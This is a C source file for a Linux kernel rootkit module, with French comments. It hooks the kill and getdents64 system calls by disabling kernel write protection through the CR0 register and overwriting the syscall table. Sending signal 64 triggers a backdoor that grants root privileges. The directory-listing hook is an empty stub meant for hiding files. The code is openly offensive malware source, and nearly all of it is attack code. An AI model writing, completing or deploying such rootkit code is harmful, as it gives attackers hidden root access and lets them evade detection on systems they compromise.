#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include "rootkit.h"

/* Variables globales pour sauvegarder les pointeurs des fonctions d'origine */
static asmlinkage long (*original_sys_kill)(pid_t pid, int sig);
static asmlinkage long (*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/* Adresse de la table des appels système (sys_call_table) */
extern unsigned long *sys_call_table;

/* Fonction de hook pour sys_kill */
static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
{
    if (sig == 64) { // Signal réservé pour donner l'accès root
        set_root();
        return 0;
    }
    return original_sys_kill(pid, sig);
}

/* Fonction de hook pour sys_getdents64 (masquage des fichiers et répertoires) */
static asmlinkage long hooked_sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long ret = original_sys_getdents64(fd, dirp, count);
    // Ajoutez ici votre logique pour filtrer ou masquer des fichiers/répertoires
    return ret;
}

/* Désactive la protection en écriture de la mémoire du noyau */
static void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

/* Réactive la protection en écriture de la mémoire du noyau */
static void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

/* Fonction pour installer les hooks */
int install_hooks(void)
{
    if (!sys_call_table)
        return -1;

    disable_write_protection();

    /* Sauvegarder les pointeurs originaux */
    original_sys_kill = (void *)sys_call_table[__NR_kill];
    original_sys_getdents64 = (void *)sys_call_table[__NR_getdents64];

    /* Remplacer les syscalls par nos hooks */
    sys_call_table[__NR_kill] = (unsigned long)hooked_sys_kill;
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_sys_getdents64;

    enable_write_protection();

    return 0;
}

/* Fonction pour désinstaller les hooks */
void uninstall_hooks(void)
{
    if (!sys_call_table)
        return;

    disable_write_protection();

    /* Restaurer les syscalls originaux */
    sys_call_table[__NR_kill] = (unsigned long)original_sys_kill;
    sys_call_table[__NR_getdents64] = (unsigned long)original_sys_getdents64;

    enable_write_protection();
}
